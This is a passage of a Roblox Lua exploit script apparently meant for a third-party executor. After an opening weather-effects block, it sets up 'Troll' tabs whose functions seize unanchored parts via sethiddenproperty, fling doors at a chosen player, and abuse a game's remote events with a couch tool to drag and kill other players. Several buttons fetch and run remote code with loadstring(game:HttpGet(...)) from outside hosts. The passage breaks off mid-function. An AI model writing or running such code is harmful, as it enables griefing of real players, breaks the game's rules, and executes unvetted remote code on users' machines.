local isRaining = false



local birds = Instance.new("Sound",SoundService)

birds.SoundId = "rbxassetid://9111139882"

birds.Volume = 0.2

birds.Looped = true

birds:Play()



local rainSound = Instance.new("Sound",SoundService)

rainSound.SoundId = "rbxassetid://9118823106"

rainSound.Volume = 0.3

rainSound.Looped = true

rainSound:Play()



local thunder = Instance.new("Sound",SoundService)

thunder.SoundId = "rbxassetid://9120018695"

thunder.Volume = 0.4



local function updateBirdSound()

    birds.Volume = isRaining and 0 or 0.2

end



local function spawnRain()

    isRaining = true

    updateBirdSound()

    for i=1,120 do

        local drop = Instance.new("Part")

        drop.Size = Vector3.new(0.1,2,0.1)

        drop.Anchored = true

        drop.CanCollide = false

        drop.Material = Enum.Material.Glass

        drop.Transparency = 0.5

        drop.Color = Color3.fromRGB(160,160,255)

        drop.Position = Vector3.new(math.random(-150,150),100,math.random(-150,150))

        drop.Parent = rainFolder

        local tween = TweenService:Create(drop,TweenInfo.new(1),{Position=drop.Position-Vector3.new(0,60,0)})

        tween:Play()

        Debris:AddItem(drop,1.5)

    end

    wait(1.5)

    isRaining = false

    updateBirdSound()

end



local function lightningStrike()

    local flash = Instance.new("Part")

    flash.Size = Vector3.new(1,1000,1)

    flash.Anchored = true

    flash.CanCollide = false

    flash.Transparency = 0.4

    flash.Material = Enum.Material.Neon

    flash.Color = Color3.new(1,1,1)

    flash.Position = Vector3.new(math.random(-100,100),500,math.random(-100,100))

    flash.Parent = workspace

    Lighting.Brightness = Lighting.Brightness + 1.5

    thunder:Play()

    wait(0.1)

    Lighting.Brightness = Lighting.Brightness - 1.5

    flash:Destroy()

end



for _,part in pairs(workspace:GetDescendants()) do

    if part:IsA("BasePart") and part.Material == Enum.Material.SmoothPlastic then

        part.Reflectance = 0.25

    end

end



task.spawn(function()

    while true do

        spawnRain()

        if math.random() < 0.2 then lightningStrike() end

        wait(1)

    end

end)



Lighting.Brightness = 2

Lighting.GlobalShadows = true

Lighting.OutdoorAmbient = Color3.fromRGB(70, 70, 70)

Lighting.FogColor = Color3.fromRGB(120, 130, 140)

Lighting.FogStart = 80

Lighting.FogEnd = 600

Lighting.EnvironmentSpecularScale = 1

Lighting.EnvironmentDiffuseScale = 0.5



local sky = Instance.new("Sky")

sky.SkyboxBk = "rbxassetid://159454299"

sky.SkyboxDn = "rbxassetid://159454296"

sky.SkyboxFt = "rbxassetid://159454293"

sky.SkyboxLf = "rbxassetid://159454286"

sky.SkyboxRt = "rbxassetid://159454300"

sky.SkyboxUp = "rbxassetid://159454304"

sky.Parent = Lighting



local color = Instance.new("ColorCorrectionEffect", Lighting)

color.Brightness = 0.03

color.Contrast = 0.15

color.Saturation = 0.05

color.TintColor = Color3.fromRGB(255, 240, 220)



local bloom = Instance.new("BloomEffect", Lighting)

bloom.Intensity = 0.8

bloom.Size = 56

bloom.Threshold = 0.9



local sunRays = Instance.new("SunRaysEffect", Lighting)

sunRays.Intensity = 0.05

sunRays.Spread = 0.8



local blur = Instance.new("BlurEffect", Lighting)

blur.Size = 0

end

})



local TrollTab = Window:MakeTab({ "Trolling Map", "map" })

TrollTab:AddSection({ "Skybox" })
TrollTab:AddButton({
 Name = "Skybox",
 Callback = function()
   loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/qZkSict1retkqFIr/raw"))()
   end
})

TrollTab:AddSection({ "Others" })

TrollTab:AddButton({

    Name = "Black Hole",

    Description = "Activating this pulls Parts to your character",

    Callback = function()

        local Players = game:GetService("Players")

local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

local Workspace = game:GetService("Workspace")



local angle = 1

local radius = 10

local blackHoleActive = false



local function setupPlayer()

    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")



    local Folder = Instance.new("Folder", Workspace)

    local Part = Instance.new("Part", Folder)

    local Attachment1 = Instance.new("Attachment", Part)

    Part.Anchored = true

    Part.CanCollide = false

    Part.Transparency = 1



    return humanoidRootPart, Attachment1

end



local humanoidRootPart, Attachment1 = setupPlayer()



if not getgenv().Network then

    getgenv().Network = {

        BaseParts = {},

        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)

    }



    Network.RetainPart = function(part)

        if typeof(part) == "Instance" and part:IsA("BasePart") and part:IsDescendantOf(Workspace) then

            table.insert(Network.BaseParts, part)

            part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)

            part.CanCollide = false

        end

    end



    local function EnablePartControl()

        LocalPlayer.ReplicationFocus = Workspace

        RunService.Heartbeat:Connect(function()

            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)

            for _, part in pairs(Network.BaseParts) do

                if part:IsDescendantOf(Workspace) then

                    part.Velocity = Network.Velocity

                end

            end

        end)

    end



    EnablePartControl()

end



local function ForcePart(v)

    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then

        for _, x in next, v:GetChildren() do

            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then

                x:Destroy()

            end

        end

        if v:FindFirstChild("Attachment") then

            v:FindFirstChild("Attachment"):Destroy()

        end

        if v:FindFirstChild("AlignPosition") then

            v:FindFirstChild("AlignPosition"):Destroy()

        end

        if v:FindFirstChild("Torque") then

            v:FindFirstChild("Torque"):Destroy()

        end

        v.CanCollide = false

        

        local Torque = Instance.new("Torque", v)

        Torque.Torque = Vector3.new(1000000, 1000000, 1000000)

        local AlignPosition = Instance.new("AlignPosition", v)

        local Attachment2 = Instance.new("Attachment", v)

        Torque.Attachment0 = Attachment2

        AlignPosition.MaxForce = math.huge

        AlignPosition.MaxVelocity = math.huge

        AlignPosition.Responsiveness = 500

        AlignPosition.Attachment0 = Attachment2

        AlignPosition.Attachment1 = Attachment1

    end

end



local function toggleBlackHole()

    blackHoleActive = not blackHoleActive

    if blackHoleActive then

        for _, v in next, Workspace:GetDescendants() do

            ForcePart(v)

        end



        Workspace.DescendantAdded:Connect(function(v)

            if blackHoleActive then

                ForcePart(v)

            end

        end)



        spawn(function()

            while blackHoleActive and RunService.RenderStepped:Wait() do

                angle = angle + math.rad(2)



                local offsetX = math.cos(angle) * radius

                local offsetZ = math.sin(angle) * radius



                Attachment1.WorldCFrame = humanoidRootPart.CFrame * CFrame.new(offsetX, 0, offsetZ)

            end

        end)

    else

        Attachment1.WorldCFrame = CFrame.new(0, -1000, 0)

    end

end



LocalPlayer.CharacterAdded:Connect(function()

    humanoidRootPart, Attachment1 = setupPlayer()

    if blackHoleActive then

        toggleBlackHole()

    end

end)



local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/miroeramaa/TurtleLib/main/TurtleUiLib.lua"))()

local window = library:Window("Black Hole")



window:Slider("Radius Black Hole",1,100,10, function(Value)

   radius = Value

end)



window:Toggle("Toggle Black Hole", true, function(Value)

       if Value then

            toggleBlackHole()

        else

            blackHoleActive = false

        end

end)



spawn(function()

    while true do

        RunService.RenderStepped:Wait()

        if blackHoleActive then

            angle = angle + math.rad(angleSpeed)

        end

    end

end)



toggleBlackHole()

    end

})

TrollTab:AddButton({

    Name = "Bring Parts",

    Description = "To use, approach the Selected Player",

    Callback = function()

local Gui = Instance.new("ScreenGui")

local Main = Instance.new("Frame")

local Box = Instance.new("TextBox")

local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

local Label = Instance.new("TextLabel")

local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")

local Button = Instance.new("TextButton")

local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")



Gui.Name = "Gui"

Gui.Parent = gethui()

Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling



Main.Name = "Main"

Main.Parent = Gui

Main.BackgroundColor3 = Color3.fromRGB(75, 75, 75)

Main.BorderColor3 = Color3.fromRGB(0, 0, 0)

Main.BorderSizePixel = 0

Main.Position = UDim2.new(0.335954279, 0, 0.542361975, 0)

Main.Size = UDim2.new(0.240350261, 0, 0.166880623, 0)

Main.Active = true

Main.Draggable = true



Box.Name = "Box"

Box.Parent = Main

Box.BackgroundColor3 = Color3.fromRGB(95, 95, 95)

Box.BorderColor3 = Color3.fromRGB(0, 0, 0)

Box.BorderSizePixel = 0

Box.Position = UDim2.new(0.0980926454, 0, 0.218712583, 0)

Box.Size = UDim2.new(0.801089942, 0, 0.364963502, 0)

Box.FontFace = Font.new("rbxasset://fonts/families/SourceSansSemibold.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)

Box.PlaceholderText = "Player Name..."

Box.Text = ""

Box.TextColor3 = Color3.fromRGB(255, 255, 255)

Box.TextScaled = true

Box.TextSize = 31.000

Box.TextWrapped = true



UITextSizeConstraint.Parent = Box

UITextSizeConstraint.MaxTextSize = 31



Label.Name = "Label"

Label.Parent = Main

Label.BackgroundColor3 = Color3.fromRGB(95, 95, 95)

Label.BorderColor3 = Color3.fromRGB(0, 0, 0)

Label.BorderSizePixel = 0

Label.Size = UDim2.new(1, 0, 0.160583943, 0)

Label.FontFace = Font.new("rbxasset://fonts/families/Nunito.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)

Label.Text = "Bring Parts"

Label.TextColor3 = Color3.fromRGB(255, 255, 255)

Label.TextScaled = true

Label.TextSize = 14.000

Label.TextWrapped = true



UITextSizeConstraint_2.Parent = Label

UITextSizeConstraint_2.MaxTextSize = 21



Button.Name = "Button"

Button.Parent = Main

Button.BackgroundColor3 = Color3.fromRGB(95, 95, 95)

Button.BorderColor3 = Color3.fromRGB(0, 0, 0)

Button.BorderSizePixel = 0

Button.Position = UDim2.new(0.183284417, 0, 0.656760991, 0)

Button.Size = UDim2.new(0.629427791, 0, 0.277372271, 0)

Button.Font = Enum.Font.Nunito

Button.Text = "Bring Parts (Off)"

Button.TextColor3 = Color3.fromRGB(255, 255, 255)

Button.TextScaled = true

Button.TextSize = 28.000

Button.TextWrapped = true



UITextSizeConstraint_3.Parent = Button

UITextSizeConstraint_3.MaxTextSize = 28



local Players = game:GetService("Players")

local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

local UserInputService = game:GetService("UserInputService")

local Workspace = game:GetService("Workspace")



local character

local humanoidRootPart



mainStatus = true

UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)

    if input.KeyCode == Enum.KeyCode.RightControl and not gameProcessedEvent then

        mainStatus = not mainStatus

        Main.Visible = mainStatus

    end

end)



local Folder = Instance.new("Folder", Workspace)

local Part = Instance.new("Part", Folder)

local Attachment1 = Instance.new("Attachment", Part)

Part.Anchored = true

Part.CanCollide = false

Part.Transparency = 1



if not getgenv().Network then

    getgenv().Network = {

        BaseParts = {},

        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)

    }



    Network.RetainPart = function(Part)

        if Part:IsA("BasePart") and Part:IsDescendantOf(Workspace) then

            table.insert(Network.BaseParts, Part)

            Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)

            Part.CanCollide = false

        end

    end



    local function EnablePartControl()

        LocalPlayer.ReplicationFocus = Workspace

        RunService.Heartbeat:Connect(function()

            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)

            for _, Part in pairs(Network.BaseParts) do

                if Part:IsDescendantOf(Workspace) then

                    Part.Velocity = Network.Velocity

                end

            end

        end)

    end



    EnablePartControl()

end



local function ForcePart(v)

    if v:IsA("BasePart") and not v.Anchored and not v.Parent:FindFirstChildOfClass("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then

        for _, x in ipairs(v:GetChildren()) do

            if x:IsA("BodyMover") or x:IsA("RocketPropulsion") then

                x:Destroy()

            end

        end

        if v:FindFirstChild("Attachment") then

            v:FindFirstChild("Attachment"):Destroy()

        end

        if v:FindFirstChild("AlignPosition") then

            v:FindFirstChild("AlignPosition"):Destroy()

        end

        if v:FindFirstChild("Torque") then

            v:FindFirstChild("Torque"):Destroy()

        end

        v.CanCollide = false

        local Torque = Instance.new("Torque", v)

        Torque.Torque = Vector3.new(100000, 100000, 100000)

        local AlignPosition = Instance.new("AlignPosition", v)

        local Attachment2 = Instance.new("Attachment", v)

        Torque.Attachment0 = Attachment2

        AlignPosition.MaxForce = math.huge

        AlignPosition.MaxVelocity = math.huge

        AlignPosition.Responsiveness = 200

        AlignPosition.Attachment0 = Attachment2

        AlignPosition.Attachment1 = Attachment1

    end

end



local blackHoleActive = false

local DescendantAddedConnection



local function toggleBlackHole()

    blackHoleActive = not blackHoleActive

    if blackHoleActive then

        Button.Text = "Bring Parts (On)"

        for _, v in ipairs(Workspace:GetDescendants()) do

            ForcePart(v)

        end



        DescendantAddedConnection = Workspace.DescendantAdded:Connect(function(v)

            if blackHoleActive then

                ForcePart(v)

            end

        end)



        spawn(function()

            while blackHoleActive and RunService.RenderStepped:Wait() do

                Attachment1.WorldCFrame = humanoidRootPart.CFrame

            end

        end)

    else

        Button.Text = "Bring Parts (Off)"

        if DescendantAddedConnection then

            DescendantAddedConnection:Disconnect()

        end

    end

end



local function getPlayer(name)

    local lowerName = string.lower(name)

    for _, p in pairs(Players:GetPlayers()) do

        local lowerPlayer = string.lower(p.Name)

        if string.find(lowerPlayer, lowerName) then

            return p

        elseif string.find(string.lower(p.DisplayName), lowerName) then

            return p

        end

    end

end



local player = nil



local function VDOYZQL_fake_script() 

    local script = Instance.new('Script', Box)



    script.Parent.FocusLost:Connect(function(enterPressed)

        if enterPressed then

            player = getPlayer(Box.Text)

            if player then

                Box.Text = player.Name

            else

            end

        end

    end)

end

coroutine.wrap(VDOYZQL_fake_script)()

local function JUBNQKI_fake_script()

    local script = Instance.new('Script', Button)



    script.Parent.MouseButton1Click:Connect(function()

        if player then

            character = player.Character or player.CharacterAdded:Wait()

            humanoidRootPart = character:WaitForChild("HumanoidRootPart")

            toggleBlackHole()

        else

        end

    end)

end

coroutine.wrap(JUBNQKI_fake_script)()

    end

})


local Troll = Window:MakeTab({ Title = "Troll Players", Icon = "user" })



Troll:AddSection({Name = "Troll Players"})



Troll:AddSection({Name = "Players"})



local Players = game:GetService("Players")

local Workspace = game:GetService("Workspace")

local RunService = game:GetService("RunService")




function DoorFlingPlayer(selectedPlayerName)

    local Players = game:GetService("Players")

    local Workspace = game:GetService("Workspace")

    local RunService = game:GetService("RunService")



    local LocalPlayer = Players.LocalPlayer

    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

    local HRP = Character:WaitForChild("HumanoidRootPart")



    local ControlledDoors = {}



    local BlackHole = Instance.new("Part")

    BlackHole.Size = Vector3.new(100000, 100000, 100000)

    BlackHole.Transparency = 1

    BlackHole.Anchored = true

    BlackHole.CanCollide = false

    BlackHole.Name = "BlackHoleTarget"

    BlackHole.Parent = Workspace



    local baseAttachment = Instance.new("Attachment")

    baseAttachment.Name = "Luscaa_BlackHoleAttachment"

    baseAttachment.Parent = BlackHole



    RunService.Heartbeat:Connect(function()

        BlackHole.CFrame = HRP.CFrame

    end)



    for _, obj in ipairs(Workspace:GetDescendants()) do

        if obj:IsA("BasePart") and string.find(obj.Name, "Door") then

            if not obj:FindFirstChild("Luscaa_Attached") and not obj.Anchored then

                obj.CanCollide = false

                obj.Transparency = 0



                for _, c in ipairs(obj:GetChildren()) do

                    if c:IsA("AlignPosition") or c:IsA("Torque") or c:IsA("Attachment") then

                        c:Destroy()

                    end

                end



                local marker = Instance.new("BoolValue", obj)

                marker.Name = "Luscaa_Attached"



                local a1 = Instance.new("Attachment", obj)

                local align = Instance.new("AlignPosition", obj)

                align.Attachment0 = a1

                align.Attachment1 = baseAttachment

                align.MaxForce = 1e20

                align.MaxVelocity = math.huge

                align.Responsiveness = 99999



                local torque = Instance.new("Torque", obj)

                torque.Attachment0 = a1

                torque.RelativeTo = Enum.ActuatorRelativeTo.World

                torque.Torque = Vector3.new(

                    math.random(-10e5, 10e5) * 10000,

                    math.random(-10e5, 10e5) * 10000,

                    math.random(-10e5, 10e5) * 10000

                )



                table.insert(ControlledDoors, {Part = obj, Align = align})

            end

        end

    end



    Workspace.DescendantAdded:Connect(function(obj)

        if obj:IsA("BasePart") and string.find(obj.Name, "Door") then

            if not obj:FindFirstChild("Luscaa_Attached") and not obj.Anchored then

                obj.CanCollide = false

                obj.Transparency = 0



                for _, c in ipairs(obj:GetChildren()) do

                    if c:IsA("AlignPosition") or c:IsA("Torque") or c:IsA("Attachment") then

                        c:Destroy()

                    end

                end



                local marker = Instance.new("BoolValue", obj)

                marker.Name = "Luscaa_Attached"



                local a1 = Instance.new("Attachment", obj)

                local align = Instance.new("AlignPosition", obj)

                align.Attachment0 = a1

                align.Attachment1 = baseAttachment

                align.MaxForce = 1e20

                align.MaxVelocity = math.huge

                align.Responsiveness = 99999



                local torque = Instance.new("Torque", obj)

                torque.Attachment0 = a1

                torque.RelativeTo = Enum.ActuatorRelativeTo.World

                torque.Torque = Vector3.new(

                    math.random(-10e5, 10e5) * 10000,

                    math.random(-10e5, 10e5) * 10000,

                    math.random(-10e5, 10e5) * 10000

                )



                table.insert(ControlledDoors, {Part = obj, Align = align})

            end

        end

    end)



    local teleportPositions = {

        Vector3.new(-128, 4, -147),

        Vector3.new(-63, 4, -146),

        Vector3.new(-40, 4, -146)

    }



    for _, pos in ipairs(teleportPositions) do

        HRP.CFrame = CFrame.new(pos)

        task.wait(0.5)

    end



    if not selectedPlayerName or not Players:FindFirstChild(selectedPlayerName) then

        return

    end



    local startTime = tick()

    while tick() - startTime < 10 do

        local character = LocalPlayer.Character

        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

        local targetPlayer = Players:FindFirstChild(selectedPlayerName)



        if humanoidRootPart and targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then

            humanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame

        else

            break

        end

        task.wait()

    end

end



local Players = game:GetService("Players")

local LocalPlayer = Players.LocalPlayer

local ReplicatedStorage = game:GetService("ReplicatedStorage")

local VirtualInputManager = game:GetService("VirtualInputManager")

local RunService = game:GetService("RunService")

local cam = workspace.CurrentCamera





local selectedPlayerName = nil

local methodKill = nil

getgenv().Target = nil

local Character = LocalPlayer.Character

local Humanoid = Character and Character:WaitForChild("Humanoid")

local RootPart = Character and Character:WaitForChild("HumanoidRootPart")



local function cleanupCouch()

    local char = LocalPlayer.Character

    if char then

        local couch = char:FindFirstChild("Chaos.Couch") or LocalPlayer.Backpack:FindFirstChild("Chaos.Couch")

        if couch then

            couch:Destroy()

        end

    end

    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")

end



LocalPlayer.CharacterAdded:Connect(function(newCharacter)

    Character = newCharacter

    Humanoid = newCharacter:WaitForChild("Humanoid")

    RootPart = newCharacter:WaitForChild("HumanoidRootPart")

    cleanupCouch()

    

    Humanoid.Died:Connect(function()

        cleanupCouch()

    end)

end)



if Humanoid then

    Humanoid.Died:Connect(function()

        cleanupCouch()

    end)

end



local function KillPlayerCouch()

    if not selectedPlayerName then

        return

    end

    local target = Players:FindFirstChild(selectedPlayerName)

    if not target or not target.Character then

        return

    end



    local char = LocalPlayer.Character

    if not char then

        return

    end

    local hum = char:FindFirstChildOfClass("Humanoid")

    local root = char:FindFirstChild("HumanoidRootPart")

    local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")

    if not hum or not root or not tRoot then

        return

    end



    local originalPos = root.Position 

    local sitPos = Vector3.new(145.51, -350.09, 21.58)



    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")

    task.wait(0.2)



    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")

    task.wait(0.3)



    local tool = LocalPlayer.Backpack:FindFirstChild("Couch")

    if tool then tool.Parent = char end

    task.wait(0.1)



    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game)

    task.wait(0.1)



    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

    hum.PlatformStand = false

    cam.CameraSubject = target.Character:FindFirstChild("Head") or tRoot or hum



    local align = Instance.new("BodyPosition")

    align.Name = "BringPosition"

    align.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

    align.D = 10

    align.P = 30000

    align.Position = root.Position

    align.Parent = tRoot



    task.spawn(function()

        local angle = 0

        local startTime = tick()

        while tick() - startTime < 5 and target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") do

            local tHum = target.Character:FindFirstChildOfClass("Humanoid")

            if not tHum or tHum.Sit then break end



            local hrp = target.Character.HumanoidRootPart

            local adjustedPos = hrp.Position + (hrp.Velocity / 1.5)



            angle += 50

            root.CFrame = CFrame.new(adjustedPos + Vector3.new(0, 2, 0)) * CFrame.Angles(math.rad(angle), 0, 0)

            align.Position = root.Position + Vector3.new(2, 0, 0)



            task.wait()

        end



        align:Destroy()

        hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)

        hum.PlatformStand = false

        cam.CameraSubject = hum



        for _, p in pairs(char:GetDescendants()) do

            if p:IsA("BasePart") then

                p.Velocity = Vector3.zero

                p.RotVelocity = Vector3.zero

            end

        end



        task.wait(0.1)

        root.CFrame = CFrame.new(sitPos)

        task.wait(0.3)



        local tool = char:FindFirstChild("Couch")

        if tool then tool.Parent = LocalPlayer.Backpack end



        task.wait(0.01)

        ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")

        task.wait(0.2)

        root.CFrame = CFrame.new(originalPos)

    end)

end



local function BringPlayerLLL()

    if not selectedPlayerName then

        return

    end

    local target = Players:FindFirstChild(selectedPlayerName)

    if not target or not target.Character then

        return

    end



    local char = LocalPlayer.Character

    if not char then

        return

    end

    local hum = char:FindFirstChildOfClass("Humanoid")

    local root = char:FindFirstChild("HumanoidRootPart")

    local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")

    if not hum or not root or not tRoot then

        return

    end



    local originalPos = root.Position 

    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")

    task.wait(0.2)



    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")

    task.wait(0.3)



    local tool = LocalPlayer.Backpack:FindFirstChild("Couch")

    if tool then

        tool.Parent = char

    end

    task.wait(0.1)



    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game)

    task.wait(0.1)



    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

    hum.PlatformStand = false

    cam.CameraSubject = target.Character:FindFirstChild("Head") or tRoot or hum



    local align = Instance.new("BodyPosition")

    align.Name = "BringPosition"

    align.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

    align.D = 10

    align.P = 30000

    align.Position = root.Position

    align.Parent = tRoot



    task.spawn(function()

        local angle = 0

        local startTime = tick()

        while tick() - startTime < 5 and target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") do

            local tHum = target.Character:FindFirstChildOfClass("Humanoid")

            if not tHum or tHum.Sit then break end



            local hrp = target.Character.HumanoidRootPart

            local adjustedPos = hrp.Position + (hrp.Velocity / 1.5)



            angle += 50

            root.CFrame = CFrame.new(adjustedPos + Vector3.new(0, 2, 0)) * CFrame.Angles(math.rad(angle), 0, 0)

            align.Position = root.Position + Vector3.new(2, 0, 0)



            task.wait()

        end



        align:Destroy()

        hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)

        hum.PlatformStand = false

        cam.CameraSubject = hum



        for _, p in pairs(char:GetDescendants()) do

            if p:IsA("BasePart") then

                p.Velocity = Vector3.zero

                p.RotVelocity = Vector3.zero

            end

        end



        task.wait(0.1)

        root.Anchored = true

        root.CFrame = CFrame.new(originalPos)

        task.wait(0.001)

        root.Anchored = false



        task.wait(0.7)

        local tool = char:FindFirstChild("Couch")

        if tool then

            tool.Parent = LocalPlayer.Backpack

        end



        task.wait(0.001)

        ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")

    end)

end



local function BringWithCouch()

    local targetPlayer = Players:FindFirstChild(getgenv().Target)

    if not targetPlayer then

        return

    end

    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then

        return

    end



    local args = { [1] = "ClearAllTools" }

    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer(unpack(args))

    local args = { [1] = "PickingTools", [2] = "Couch" }

    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))



    local couch = LocalPlayer.Backpack:WaitForChild("Couch", 2)

    if not couch then

        return

    end



    couch.Name = "Chaos.Couch"

    local seat1 = couch:FindFirstChild("Seat1")

    local seat2 = couch:FindFirstChild("Seat2")

    local handle = couch:FindFirstChild("Handle")

    if seat1 and seat2 and handle then

        seat1.Disabled = true

        seat2.Disabled = true

        handle.Name = "Handle "

    else

        return

    end

    couch.Parent = LocalPlayer.Character



    local tet = Instance.new("BodyVelocity", seat1)

    tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

    tet.P = 1250

    tet.Velocity = Vector3.new(0, 0, 0)

    tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"



    repeat

        for m = 1, 35 do

            local pos = { x = 0, y = 0, z = 0 }

            local tRoot = targetPlayer.Character and targetPlayer.Character.HumanoidRootPart

            if not tRoot then break end

            pos.x = tRoot.Position.X + (tRoot.Velocity.X / 2)

            pos.y = tRoot.Position.Y + (tRoot.Velocity.Y / 2)

            pos.z = tRoot.Position.Z + (tRoot.Velocity.Z / 2)

            seat1.CFrame = CFrame.new(Vector3.new(pos.x, pos.y, pos.z)) * CFrame.new(-2, 2, 0)

            task.wait()

        end

        tet:Destroy()

        couch.Parent = LocalPlayer.Backpack

        task.wait()

        couch:FindFirstChild("Handle ").Name = "Handle"

        task.wait(0.2)

        couch.Parent = LocalPlayer.Character

        task.wait()

        couch.Parent = LocalPlayer.Backpack

        couch.Handle.Name = "Handle "

        task.wait(0.2)

        couch.Parent = LocalPlayer.Character

        tet = Instance.new("BodyVelocity", seat1)

        tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

        tet.P = 1250

        tet.Velocity = Vector3.new(0, 0, 0)

        tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"

    until targetPlayer.Character and targetPlayer.Character.Humanoid and targetPlayer.Character.Humanoid.Sit == true

    task.wait()

    tet:Destroy()

    couch.Parent = LocalPlayer.Backpack

    task.wait()

    couch:FindFirstChild("Handle ").Name = "Handle"

    task.wait(0.3)

    couch.Parent = LocalPlayer.Character

    task.wait(0.3)

    couch.Grip = CFrame.new(Vector3.new(0, 0, 0))

    task.wait(0.3)

    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")

end



local function KillWithCouch()

    local targetPlayer = Players:FindFirstChild(getgenv().Target)

    if not targetPlayer then

        return

    end

    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then

        return

    end



    local args = { [1] = "ClearAllTools" }

    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer(unpack(args))

    local args = { [1] = "PickingTools", [2] = "Couch" }

    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))



    local couch = LocalPlayer.Backpack:WaitForChild("Couch", 2)

    if not couch then

        return

    end



    couch.Name = "Chaos.Couch"

    local seat1 = couch:FindFirstChild("Seat1")

    local seat2 = couch:FindFirstChild("Seat2")

    local handle = couch:FindFirstChild("Handle")

    if seat1 and seat2 and handle then

        seat1.Disabled = true

        seat2.Disabled = true

        handle.Name = "Handle "

    else

        return

    end

    couch.Parent = LocalPlayer.Character



    local tet = Instance.new("BodyVelocity", seat1)

    tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

    tet.P = 1250

    tet.Velocity = Vector3.new(0, 0, 0)

    tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"



    repeat

        for m = 1, 35 do

            local pos = { x = 0, y = 0, z = 0 }

            local tRoot = targetPlayer.Character and targetPlayer.Character.HumanoidRootPart

            if not tRoot then break end

            pos.x = tRoot.Position.X + (tRoot.Velocity.X / 2)

            pos.y = tRoot.Position.Y + (tRoot.Velocity.Y / 2)

            pos.z = tRoot.Position.Z + (tRoot.Velocity.Z / 2)

            seat1.CFrame = CFrame.new(Vector3.new(pos.x, pos.y, pos.z)) * CFrame.new(-2, 2, 0)

            task.wait()

        end

        tet:Destroy()

        couch.Parent = LocalPlayer.Backpack

        task.wait()

        couch:FindFirstChild("Handle ").Name = "Handle"

        task.wait(0.2)

        couch.Parent = LocalPlayer.Character

        task.wait()

        couch.Parent = LocalPlayer.Backpack

        couch.Handle.Name = "Handle "

        task.wait(0.2)

        couch.Parent = LocalPlayer.Character

        tet = Instance.new("BodyVelocity", seat1)

        tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

        tet.P = 1250

        tet.Velocity = Vector3.new(0, 0, 0)

        tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"

    until targetPlayer.Character and targetPlayer.Character.Humanoid and targetPlayer.Character.Humanoid.Sit == true

    task.wait()

    couch.Parent = LocalPlayer.Backpack

    seat1.CFrame = CFrame.new(Vector3.new(9999, -450, 9999))

    seat2.CFrame = CFrame.new(Vector3.new(9999, -450, 9999))

    couch.Parent = LocalPlayer.Character

    task.wait(0.1)

    couch.Parent = LocalPlayer.Backpack

    task.wait(2)

